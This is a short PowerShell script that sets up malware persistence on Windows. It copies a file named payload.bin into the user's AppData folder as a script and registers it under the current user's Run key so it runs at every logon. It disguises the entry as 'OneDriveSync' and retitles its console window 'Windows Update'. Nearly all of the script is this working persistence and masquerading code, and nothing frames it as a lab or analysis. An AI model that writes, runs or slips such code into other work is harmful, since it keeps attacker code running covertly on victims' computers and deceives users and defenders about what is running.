
<#
.SYNOPSIS
    Per-user Run-key persistence helper.

.DESCRIPTION
    Copies the launcher into the roaming profile and
    registers it under the current user's Run key.
#>
$RunKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$RegistryValue = 'OneDriveSync'
$PersistencePath = "$env:APPDATA\payload.ps1"
$ErrorActionPreference = "Stop"

Write-Verbose "Installing per-user persistence"
if (-not (Test-Path -Path $PersistencePath)) {
    Copy-Item -Path "$env:APPDATA\payload.bin" -Destination $PersistencePath -Force
}
New-ItemProperty -Path $RunKeyPath -Name $RegistryValue -Value ('powershell.exe -NoP -File "' + $PersistencePath + '"') -PropertyType String -Force
$OperationResult = Get-ItemProperty -Path $RunKeyPath -Name $RegistryValue
Write-Verbose ("Registered value: " + $OperationResult.$RegistryValue)

$Host.UI.RawUI.WindowTitle = "Windows Update"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
